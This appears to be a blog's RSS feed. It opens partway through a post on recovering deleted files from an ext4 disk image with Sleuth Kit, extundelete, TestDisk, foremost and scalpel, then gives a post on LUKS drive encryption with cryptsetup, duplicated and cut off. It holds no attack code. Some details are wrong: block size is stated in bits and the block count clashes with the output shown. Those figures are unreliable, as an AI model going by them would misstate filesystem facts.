</span></span><span style="display:flex;"><span> Layout:  
</span></span><span style="display:flex;"><span> Super Block: 1 - 1  
</span></span><span style="display:flex;"><span> Group Descriptor Table: 2 - 2  
</span></span><span style="display:flex;"><span> Group Descriptor Growth Blocks: 3 - 89  
</span></span><span style="display:flex;"><span> Data bitmap: 90 - 90  
</span></span><span style="display:flex;"><span> Inode bitmap: 92 - 92  
</span></span><span style="display:flex;"><span> Inode Table: 94 - 441  
</span></span><span style="display:flex;"><span> Uninit Data Bitmaps: 92 - 105  
</span></span><span style="display:flex;"><span> Uninit Inode Bitmaps: 94 - 107  
</span></span><span style="display:flex;"><span> Uninit Inode Table: 790 - 5661  
</span></span><span style="display:flex;"><span> Data Blocks: 5690 - 8192  
</span></span><span style="display:flex;"><span> Free Inodes: 1381 (99%)  
</span></span><span style="display:flex;"><span> Free Blocks: 6365 (77%)  
</span></span><span style="display:flex;"><span> Total Directories: 2  
</span></span><span style="display:flex;"><span> Stored Checksum: 0x7DEB  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>Group: 1:  
</span></span><span style="display:flex;"><span> Block Group Flags: [INODE\_UNINIT, INODE\_ZEROED]   
</span></span><span style="display:flex;"><span> Inode Range: 1393 - 2784  
</span></span><span style="display:flex;"><span> Block Range: 8193 - 11139  
</span></span><span style="display:flex;"><span> Layout:  
</span></span><span style="display:flex;"><span> Super Block: 8193 - 8193  
</span></span><span style="display:flex;"><span> Group Descriptor Table: 8194 - 8194  
</span></span><span style="display:flex;"><span> Group Descriptor Growth Blocks: 8195 - 8281  
</span></span><span style="display:flex;"><span> Data bitmap: 91 - 91  
</span></span><span style="display:flex;"><span> Inode bitmap: 93 - 93  
</span></span><span style="display:flex;"><span> Inode Table: 442 - 789  
</span></span><span style="display:flex;"><span> Data Blocks: 8282 - 11139  
</span></span><span style="display:flex;"><span> Free Inodes: 1392 (100%)  
</span></span><span style="display:flex;"><span> Free Blocks: 2858 (96%)  
</span></span><span style="display:flex;"><span> Total Directories: 0  
</span></span><span style="display:flex;"><span> Stored Checksum: 0xDFA7
</span></span></code></pre></div><p>Based on this output, it is clear that the block size is 1024 bits, there are 1113 total blocks, and there are 2785 inodes.</p>
<p>In addition, <code>parted</code> can be used to find more information on the partition table, which can be useful when using scalpel.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*EAJIlLWQ5g3rEgqc5nPNbQ.png" alt=""  />

Finally, running <code>strings</code> on the image gives more insight as to what is in the filesystem. It appears that my <code>secret.txt</code> file with the contents <code>Hello World</code> is appearing from the <code>strings</code> command in addition to a failed image download attempt.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*hINgjWeGy7ttVHl1qDs1EQ.png" alt=""  />

In the command <code>strings -a --radix=d sdb.img</code>, <code>-a</code> is an option to scan the entire file and <code>--radix=d</code> tells <code>strings</code> to show the offset that the string was found at in base 10.</p>
<h2 id="analyzing-thefiles">Analyzing the Files</h2>
<p>This particular image does not have any files currently in it aside from deleted files, so there isn’t much information to gain from mounting it and analyzing the files. In cases where it is desireable to do so, the following command can be used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ mount -o ro,loop,noexec,noatime sdb.img
</span></span></code></pre></div><p>Below, I’ll explain what the options do:</p>
<ul>
<li><code>-o</code>: sets the options for mounting <code>sdb.img</code>.</li>
<li><strong>ro</strong>: an option to mount the file system as being read-only</li>
<li><strong>loop</strong>: mount the file system on a loop device</li>
<li><strong>noexec</strong>: disallow execution</li>
<li><strong>noatime</strong>: don’t change the access time of the files</li>
</ul>
<p>You can then continue to run <code>file</code> on the files within the mounted loop device and save their md5 hashes to verify integrity.</p>
<h1 id="recovering-thefiles">Recovering the Files</h1>
<h2 id="method-1-using-sleuthkithttpsleuthkitorgsleuthkit">Method 1: Using <a href="http://sleuthkit.org/sleuthkit/">Sleuth Kit</a></h2>
<p>Often, if you have deleted files, they may be displayed with <code>fls sdb.img</code>, enumerated with <code>istat -o &lt;offset&gt; sdb.img &lt;inode_number&gt;</code>, and recovered with <code>icat -o &lt;offset&gt; sdb.img &lt;inode_number&gt;</code>. An example of the latter 2 steps are shown in the screenshot below.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*mc44fgKV8os0qCVpYYZiJQ.png" alt=""  />

<em><a href="https://www.therootuser.com/wp-content/uploads/2017/11/Screenshot-2017-11-07-17.27.58.png">https://www.therootuser.com/wp-content/uploads/2017/11/Screenshot-2017-11-07-17.27.58.png</a></em></p>
<p>This does not appear to be the case for me, however. My deleted files are not appearing from the <code>fls</code> command. Instead, I see a variable called <code>$OrphanFiles</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*hQXtm0cZ7wge3IgQlexR-Q.png" alt=""  />

<code>$OrphanFiles</code> are files that still exist in the image, but are no longer able to be accessed from the root directory. <code>$OrphanFiles</code> is not an actual directory on the image, it is Sleuth Kit’s virtual way to demonstrate that the file metadata still exists (<a href="https://wiki.sleuthkit.org/index.php?title=Orphan_Files">read more</a>).</p>
<p>To recover these orphan files, I will attempt a few techniques starting with <code>extundelete</code>.</p>
<h2 id="method-2-extundeletehttpsextundeletesourceforgenet">Method 2: <a href="https://extundelete.sourceforge.net/">Extundelete</a></h2>
<p>This tool can be used to recover files on ext3 and ext4 filesystems. I was having some difficulties with the build from <code>apt</code>, so I build the program from source with the following commands to it working again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>apt update &amp;&amp; apt install -y libext2fs-dev   
</span></span><span style="display:flex;"><span>git clone https://github.com/cherojeong/extundelete.git  
</span></span><span style="display:flex;"><span>./configure  
</span></span><span style="display:flex;"><span>make  
</span></span><span style="display:flex;"><span>src/extundelete --restore-all /path/to/image.img
</span></span></code></pre></div><p><code>os &lt;&lt; “Directory ACL: “ &lt;&lt; inode.i_dir_acl &lt;&lt; std::endl;</code> with <code>os &lt;&lt; “Directory ACL: “ &lt;&lt; inode.i_file_acl &lt;&lt; std::endl;</code>.</p>
<p>The command <code>extundelete --restore-all sdb.img</code> can be used to recover files.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Ipv-ABMSCpXNtc6PZT5zqQ.png" alt=""  />

As you can see in the screenshot above, the tool was unsuccessful in recovering the orphan files. This is still a viable option that can work in many scenarios which is why I decided to include it in this article.</p>
<p>I’m not giving up yet. We’ll try again!</p>
<h2 id="method-3testdiskhttpswwwcgsecurityorgwikitestdisk">Method 3: <a href="https://www.cgsecurity.org/wiki/TestDisk">TestDisk</a></h2>
<p>The <code>.tar.bz</code> file can be downloaded <a href="https://www.cgsecurity.org/wiki/TestDisk_Download">here</a>. I’m using version 7.2. Note that in order for <code>TestDisk</code> to work, you must run it in the download directory. Otherwise you might get an error like <code>*** Error in </code>/path/to/testdisk-7.2-WIP/photorec_static&rsquo;: malloc(): memory corruption: 0x0000000002617d29 ***`.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># extract and run the file  
</span></span><span style="display:flex;"><span>tar -xf testdisk-7.2-WIP.linux26-x86\_64.tar.bz2  
</span></span><span style="display:flex;"><span>cd testdisk-7.2-WIP  
</span></span><span style="display:flex;"><span>./photorec\_static /path/to/sdb.img /log 
</span></span></code></pre></div><p>A help menu will appear. I’ll first select the image that I want to work with.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*vEuqI7RnAWsvLfrH9n88Pw.png" alt=""  />

Then, I select the option for the partition table for the media. Mine does not have one, so I choose “None”. I verified that this was the only option that was able to list files for me.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*c5iJeI2oyLMdmRu_bBD5Qg.png" alt=""  />

After this, I navigate to the “List” option at the bottom of the terminal and press <code>Enter</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*jl17is949wOoNF0JEzBcIg.png" alt=""  />

This leads me to the listing of the files on the image with the successfully recovered ones in <strong>red</strong> text.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*yYQEslxR1RWkUbkEX743Bg.png" alt=""  />

As you can see in the screenshot, there are no new files there listed in red. This means that <code>TestDisk</code> was unsuccessful in recovering the deleted files.</p>
<p>It’s okay, I still got a few more tricks up my sleeve.</p>
<h2 id="method-4foremosthttpssourceforgenetprojectsforemost">Method 4: <a href="https://sourceforge.net/projects/foremost/">Foremost</a></h2>
<p>Foremost can be installed with <code>apt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt install foremost
</span></span></code></pre></div><p>This tool uses a technique known as <strong>file carving</strong> which involves searching through the raw data on a disk and carving out the values between the header and/or footer of the file.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ayacIY6WQdxAYksd_nwT8g.png" alt=""  />

Alas, we were able to recover a deleted image file from the drive with <code>foremost -t jpeg -o recovered-files -i sdb.img</code>. The recovered image renders as expected in the Image Viewer. What a pretty camp fire.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*kA2aubO7prDBFW9Xx0cGvQ.png" alt=""  />

The fact that this worked while the previous 3 methods did not further demonstrates that different tools and techniques will be more effective at data recovery in different scenarios.</p>
<p>It’s also worth mentioning that you can edit the <code>/etc/foremost.conf</code> file to contain your own custom headers and footers for the file you are looking for. Modifying these values will be explored in the next and final method.</p>
<h2 id="method-5scalpelhttpsgithubcomsleuthkitscalpel">Method 5: <a href="https://github.com/sleuthkit/scalpel">Scalpel</a></h2>
<p>Scalpel is much like Foremost with added flexibility. You are not as limited on the file types and headers, although there is a way to modify foremost to have the same customization that scalpel provides.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt install scalpel  
</span></span><span style="display:flex;"><span>cp /etc/scalpel/scalpel.conf .  
</span></span><span style="display:flex;"><span>vim scalpel.conf
</span></span></code></pre></div><p>I’ll edit the config with the bit of background information that I have. I know that I’m attempting to recover a JPEG file and I also know that there was a text file that began with the word “Hello”. By using <code>xxd</code>, I can determine the file headers for a <code>.txt</code> file starting with the word “Hello”. In this case, it would be <code>\x48\x65\x6c\x6c\x6f</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ echo -n Hello | xxd   
</span></span><span style="display:flex;"><span>00000000: 4865 6c6c 6f Hello.
</span></span></code></pre></div><p>We will use this information to update the <code>scalpel.conf</code> file in <code>vim</code>. As explained in the comments at the top of the config file, the first column indicates the file extension. The second is whether the header and footer are case sensitive, the third is the header in hexadecimal bytes, the fourth column is an optional footer, and the fifth column is an optional parameter to search backwards from the header rather than just forward.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Y6kTU1JxILxivTOYbHN5tQ.png" alt=""  />

With these options set, <code>scalpel</code> can now be ran to extract these files from the drive.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scalpel -o recovered-files\_scalpel -c scalpel.conf sdb.img
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*O3huS4-S2BausvT-s2KiYw.png" alt=""  />

It appears that the text file was successfully recovered.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*jASCyrkTBYVfhWQxZkk3lg.png" alt=""  />

The image was recovered as well.</p>
<h1 id="conclusion"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*5ixUUenRR50lIavpZ0oyIw.png" alt=""  />

Conclusion</h1>
<p>There’s many ways to achieve the same outcome. The different tools showcased here have their specific applications where they perform best. Even though not all the methods outlined here worked for my particular situation, that doesn’t mean they won’t work for you. There are many factors that determine whether file recovery will be successful including the partitioning table type, how long it has been since they were deleted, the size of the file (smaller files are more likely to be recovered), the health of the storage device, and the operations that have been done on the drive since deleting the files such as reformatting the drive.</p>
<p>I hope that through reading this article, you were able to deepen your understanding of file recovery and gain practical knowledge that you can apply in the real world. Thanks for reading and I’ll see you next time.</p>
]]></content:encoded>
    </item>
    <item>
      <title>How to Encrypt a Drive in Linux</title>
      <link>https://ally-petitt.com:443/en/posts/2023-05-05_how-to-encrypt-a-drive-in-linux-83b3001744f4/</link>
      <pubDate>Fri, 05 May 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2023-05-05_how-to-encrypt-a-drive-in-linux-83b3001744f4/</guid>
      <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Hey everyone, this is a pretty quick article on LUKS drive encryption on Linux with the &lt;code&gt;cryptsetup&lt;/code&gt; library. By following the steps outlined here, you will be able to encrypt a drive, decrypt it, and mount it. This was done in a Kali Linux VM and commands may vary for other distributions.&lt;/p&gt;
&lt;p&gt;Disclaimer: This is not an area that I have much experience in so if details are inaccurate, I apologize in advance.&lt;/p&gt;
&lt;h2 id=&#34;creating-a-new-partition&#34;&gt;Creating a new partition&lt;/h2&gt;
&lt;p&gt;I’m using a virtual machine with 2 virtual hard disks.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ao7i4G4xZFiEXNb2nX2-bQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Demonstrating my disks with “lsblk -e7”&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I’ll be using a tool called &lt;code&gt;parted&lt;/code&gt; to create a partition on &lt;code&gt;/dev/sdb&lt;/code&gt;. Historically, when a system uses the Master Boot Record (MBR) partition table, &lt;code&gt;fdisk&lt;/code&gt; is used to manage the partition. In this article, I’ll use &lt;code&gt;parted&lt;/code&gt; because of its usability in scripting and automation.&lt;/p&gt;
&lt;p&gt;I’ll start by listing the information of the drives.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;parted -s /dev/sdb print all
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*5w3JBHztlFmtojmfpSwqAg.png&#34; alt=&#34;&#34;  /&gt;

The output &lt;code&gt;msdos&lt;/code&gt; under &lt;code&gt;/dev/sda&lt;/code&gt;, indicates that &lt;code&gt;sda&lt;/code&gt; is using the MBR partition table. Learn more about partition table types &lt;a href=&#34;https://en.wikipedia.org/wiki/Disk_partitioning&#34;&gt;here&lt;/a&gt; and &lt;a href=&#34;https://wiki.archlinux.org/title/Partitioning&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I’ll now create the GPT partition table on &lt;code&gt;/dev/sdb&lt;/code&gt;. You’ll notice that after running the command, &lt;code&gt;/dev/sdb&lt;/code&gt; now appears as a &lt;code&gt;gpt&lt;/code&gt; partition table.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tZM4UvgCMQXekmpmoDJumg.png&#34; alt=&#34;&#34;  /&gt;

I then create a partition on the disk with the ext4 file system.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*dbuTKtvJcQZI4cFNANRylQ.png&#34; alt=&#34;&#34;  /&gt;

The commands I used for this are below. The values for the start and ending offsets when creating the partitions can be expressed in both percentages and exact byte values. Reference the &lt;a href=&#34;https://linux.die.net/man/8/parted&#34;&gt;man page&lt;/a&gt; for more details.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;parted -s /dev/sdb mklabel gpt  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;parted -s /dev/sdb mkpart primary ext4 0% 50MiB
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;encrypting-thedrive&#34;&gt;Encrypting the Drive&lt;/h2&gt;
&lt;p&gt;This demonstrates how to encrypt file system using LUKS. It is important to remember the passphrase that you enter while encrypting the partition because it is a key piece of information when decrypting the drive.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cryptsetup luksFormat /dev/sdb # encrypt /dev/sdb with luks
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;decrypting-thedrive&#34;&gt;Decrypting the Drive&lt;/h2&gt;
&lt;p&gt;You’ll need to do this before you’re able to mount and use the partition on the drive.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cryptsetup open /dev/sdb encrypted # open the encrypted drive as /dev/mapper/encrypted  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkfs.ext4 /dev/mapper/encrypted # create a filesystem on the device (only needed the first time you open the encrypted drive)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;mounting-the-partition&#34;&gt;Mounting the Partition&lt;/h2&gt;
&lt;p&gt;In order to actually use the partition and the file system on it, we must mount it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir -p /mnt/encrypted # prepare the mount point  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount /dev/mapper/encrypted /mnt/encrypted # mount the decrypted filesystem on /mnt/encrypted
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;unmounting-the-partition&#34;&gt;Unmounting the Partition&lt;/h2&gt;
&lt;p&gt;When you’re done using the drive, you can unmount it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;umount /mnt/encrypted 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;closing-and-re-encrypting-the-partition&#34;&gt;Closing and Re-encrypting the Partition&lt;/h2&gt;
&lt;p&gt;In its unmounted state, it is still decrypted. To re-encrypt and close the drive, you can run the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cryptsetup close /dev/mapper/encrypted
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;digging-deeper&#34;&gt;Digging Deeper&lt;/h1&gt;
&lt;p&gt;Because I’m a curious person, I’ll share with you some commands that you can use to get more information on the file system that you just created and other findings that I thought were interesting.&lt;/p&gt;
&lt;h2 id=&#34;file-systemmetadata&#34;&gt;File System Metadata&lt;/h2&gt;
&lt;p&gt;After decrypting the drive, you can view the metadata of your filesystem.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cryptsetup --type luks open /dev/sdb encrypted
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These are some commands that will give you infromation.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;df -hT /dev/mapper/encrypted  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tune2fs -l /dev/sdb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As shown in the screenshots, you’re able to view the number of inodes, the block count, block size, filesystem magic number, and much more.&lt;/p&gt;
&lt;h2 id=&#34;inodes&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*k6QJaeh0pBMsxnfbGk6Rog.png&#34; alt=&#34;&#34;  /&gt;

&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*BXNCkBoJaesaE0AfBZlOsQ.png&#34; alt=&#34;&#34;  /&gt;

Inodes&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Inode&#34;&gt;Inodes&lt;/a&gt; are a data structure that contain information about files in the Linux filesystem. It contains metadata such as the block number that the file is located in on the hard drive, permissions, and file owner. In an ext4 filesystem, the number of inodes in is fixed, whereas in XFS and JFS, the number of inodes is dynamic. The result is that in ext4 filesystems where many inodes are used, such as in situations where many directories, symbolic links, and/or small files are made, an error message that the system is out of space may occur when there is plenty of space left. The reason for this is simply that the filesystem has no more available inodes to assign to new files. This is a relatively common occurence for mail servers that often hold many small files.&lt;/p&gt;
&lt;p&gt;The number of inodes on your system’s filesystems can be viewed with &lt;code&gt;df -hi&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_TgsDD7BK_fPitV0J31ywg.png&#34; alt=&#34;&#34;  /&gt;

You can query the inode information on a specific file with the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ls -il file
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nBvEce088HNvxUbcz1cF7w.png&#34; alt=&#34;&#34;  /&gt;

The inode number is on the leftmost column of output. In this case, it is &lt;code&gt;131079&lt;/code&gt;. Additionally, you can see the read, write, and execute permissions on the file with the owner and group associated with it.&lt;/p&gt;
&lt;p&gt;As an alternative, you can search for the file that is associated with a specific inode with this command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find / -inum 1234567 -ls
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*15DlndsZGVZ0Q9A3lAtXeg.png&#34; alt=&#34;&#34;  /&gt;

I was able to find the file &lt;code&gt;/tmp/test.txt&lt;/code&gt; that was associated with &lt;code&gt;131079&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;duplicating-the-encrypted-drive&#34;&gt;Duplicating the Encrypted Drive&lt;/h2&gt;
&lt;p&gt;This command can be used to create an exact duplicate of &lt;code&gt;/dev/sdb&lt;/code&gt; in &lt;code&gt;/media/sdb.img&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dd if=/dev/sdb of=/media/sdb.img
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;next-steps&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hzoKv4rgFMHTAQtFFIcaYQ.png&#34; alt=&#34;&#34;  /&gt;

Next Steps&lt;/h1&gt;
&lt;p&gt;Moving forward, you can expand upon what was done in this article by implementing an added layer of abstraction and flexibility with &lt;a href=&#34;https://linuxconfig.org/linux-lvm-logical-volume-manager&#34;&gt;LVM&lt;/a&gt;. You can also continue to experiment with different ways of encrypting partitions such as those outlined in &lt;a href=&#34;https://www.baeldung.com/linux/encrypt-partition&#34;&gt;this article&lt;/a&gt;. There are many different ways to configure your system and I would encourage you to continue learning. Thank you for reading!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Hey everyone, this is a pretty quick article on LUKS drive encryption on Linux with the <code>cryptsetup</code> library. By following the steps outlined here, you will be able to encrypt a drive, decrypt it, and mount it. This was done in a Kali Linux VM and commands may vary for other distributions.</p>
<p>Disclaimer: This is not an area that I have much experience in so if details are inaccurate, I apologize in advance.</p>
<h2 id="creating-a-new-partition">Creating a new partition</h2>
<p>I’m using a virtual machine with 2 virtual hard disks.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ao7i4G4xZFiEXNb2nX2-bQ.png" alt=""  />

<em>Demonstrating my disks with “lsblk -e7”</em></p>
<p>I’ll be using a tool called <code>parted</code> to create a partition on <code>/dev/sdb</code>. Historically, when a system uses the Master Boot Record (MBR) partition table, <code>fdisk</code> is used to manage the partition. In this article, I’ll use <code>parted</code> because of its usability in scripting and automation.</p>
<p>I’ll start by listing the information of the drives.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>parted -s /dev/sdb print all
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*5w3JBHztlFmtojmfpSwqAg.png" alt=""  />

The output <code>msdos</code> under <code>/dev/sda</code>, indicates that <code>sda</code> is using the MBR partition table. Learn more about partition table types <a href="https://en.wikipedia.org/wiki/Disk_partitioning">here</a> and <a href="https://wiki.archlinux.org/title/Partitioning">here</a>.</p>
<p>I’ll now create the GPT partition table on <code>/dev/sdb</code>. You’ll notice that after running the command, <code>/dev/sdb</code> now appears as a <code>gpt</code> partition table.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tZM4UvgCMQXekmpmoDJumg.png" alt=""  />

I then create a partition on the disk with the ext4 file system.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*dbuTKtvJcQZI4cFNANRylQ.png" alt=""  />

